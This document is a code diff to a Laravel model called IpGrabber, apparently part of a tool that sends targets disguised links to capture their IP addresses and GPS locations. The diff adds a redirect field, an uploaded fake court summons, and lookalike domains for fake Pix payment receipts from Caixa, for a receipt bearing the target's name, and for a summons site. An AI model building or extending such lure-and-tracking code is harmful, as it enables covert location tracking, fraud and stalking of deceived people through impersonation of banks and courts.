@@ -37,6 +37,7 @@ class IpGrabber extends Model
         'tracking_domain',
         'tracking_channel',
         'mensagem',
+        'redirect_url',
         'noticia_url',
         'capture_gps',
         'capture_alvo',
@@ -45,6 +46,7 @@ class IpGrabber extends Model
         'og_descricao',
         'og_imagem',
         'og_imagem_upload',
+        'intimacao_arquivo',
         'created_by',
         'ip',
         'ip_local',
@@ -95,6 +97,9 @@ class IpGrabber extends Model
             if ($ipGrabber->og_imagem_upload) {
                 Storage::disk('public')->delete($ipGrabber->og_imagem_upload);
             }
+            if ($ipGrabber->intimacao_arquivo) {
+                Storage::disk('public')->delete($ipGrabber->intimacao_arquivo);
+            }
         });
     }
 
@@ -131,6 +136,9 @@ class IpGrabber extends Model
 
         return match ($this->preview_tipo) {
             'pix_bradesco' => 'comprovante-pix.site',
+            'pix_caixa' => 'comprovante.online',
+            'pix_nome_alvo' => 'comprovante.online',
+            'intimacao' => 'intimacao.online',
             'noticia' => 'agenciadanoticia.online',
             default => filled($this->tracking_domain) ? (string) $this->tracking_domain : null,
         };
